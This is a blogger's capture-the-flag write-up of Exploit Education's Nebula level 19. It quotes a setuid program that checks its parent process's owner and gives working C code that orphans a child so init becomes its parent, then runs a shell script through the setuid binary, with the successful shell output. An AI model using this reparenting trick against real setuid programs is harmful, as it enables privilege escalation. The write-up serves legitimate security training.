### [Exploit Education Level 19](https://exploit.education/nebula/level-19/)

## Challenge
There is a flaw in the below program in how it operates.

To do this level, log in as the `level19` account with the password `level19`. Files for this level can be found in `/home/flag19`.
## Vulnerability
This is an odd vulnerability and it happens due too how linux system operated.  
```cpp
int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &statbuf) == -1) {
      printf("Unable to check parent process\n");
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve("/bin/sh", argv, envp);
      err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
```
So the program will execute a shell if we run the program is root. But how can we run it as root?. There is a concept of process inheritance in Linux.
>Each process has a parent, and a parent process can have multiple children. The exception to this rule is the init process, which is started at system boot. The init process is its own parent and is the parent, either directly or indirectly, of all other processes running on the system. This process is run as root and itâ€™s Process ID (PID) is 1:
Lets take a look at the program.

```bash
level19@nebula:~$ ps aux |grep 'PID\|init' 
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.3   3200  1796 ?        Ss   11:32   0:00 /sbin/init
level19   1336  0.0  0.1   4156   552 pts/0    R+   11:45   0:00 grep --color=auto PID\|init
```
>If a process spawns a new child (e.g. through the fork() system call in C), it becomes the parent of that child process. If the parent is killed before the child, the child process is said to become an orphan process. All orphan processes are adopted by init. 

[Source](https://decepticode.wordpress.com/2016/05/07/nebula-level19/) (yeah I know its another writeup. But I had no clue how this stuff works do i had to look up for other writeups. )

So if we can run a program that will create a `child process` and if the `parent process` dies before the `child process` we will have `PID` of `1`. And then we can exploit this line.
```cpp
/* Get the parent's /proc entry, so we can verify its user id */
 
snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());
```
The `getpid()` will return the `PID` of `root`.  
Lets write a program that will spawn a `child` and then we can make the `child` sleep while the `parent` exits. (This sentence sounds a bit weird)
```cpp
#include <stdio.h>
#include <unistd.h>

int main(void){
  pid_t pid=fork();
  if(pid==0) /*child process*/
  {
        char *cmd = "/home/flag19/flag19";
        char *args[] = { "/bin/sh","-c","/tmp/run.sh"};

        sleep(3);
        printf("Pid: %d\n", getppid());
        execv(cmd,args);
        return 0;
  }
  else /*parent process*/
  {
        return 0;
  }
}
```
This program will run the `flag19` program and it will execute the contents of `run.sh` file. The `run.sh` file will run the `getflag` command and save the output to a file named `/tmp/out`.  
Let try it out.
```bash
level19@nebula:/tmp$ cat run.sh 
getflag > /tmp/out
level19@nebula:~$ gcc fork.c
level19@nebula:~$ ./a.out
level19@nebula:~$ Pid: 1

level19@nebula:~$
```
So we have `PID` of `1`. Lets check the output of `/tmp/out`
```bash
level19@nebula:/tmp$ cat out
You have successfully executed getflag on a target account
```
### Solved!

## After Thoughts
Haw mahn that was a hell of a ride. I have finally completed the `nebula` section of Exploit-Education. I am planning to continue with Fusion or maybe something else. I wouldn't say that I enjoyed every level (because sometimes i get frustrated when i can't find any vulnerability. Yeah i know its part of the learning and i am working on it) but I definitely learned  a lot of strange ways to exploit programs.
